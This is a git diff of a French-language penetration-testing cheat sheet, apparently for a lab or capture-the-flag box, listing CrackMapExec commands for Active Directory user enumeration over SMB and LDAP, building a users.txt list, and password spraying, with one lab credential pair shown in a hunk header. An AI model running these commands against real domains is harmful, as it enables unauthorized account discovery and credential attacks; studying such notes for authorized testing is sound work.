@@ -11,14 +11,21 @@ cme smb $TARGET_IP -u "sql_svc" -p "REGGIE1234ronnie" -d "sequel"  --pass-pol | 
 ```
 
 ## Comptes utlisateurs
+### SMB
+
+```
+cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users
+
+# Creation d'une liste d'utilisateurs
+cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
+```
 ### LDAP
 ```
-$ crackmapexec ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users
+$ cme ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users
 ```
 
 ```
-# Creation d'une liste d'utilisateurs
-cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
+
 
 # Password spraying with new grabbed users
 cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success
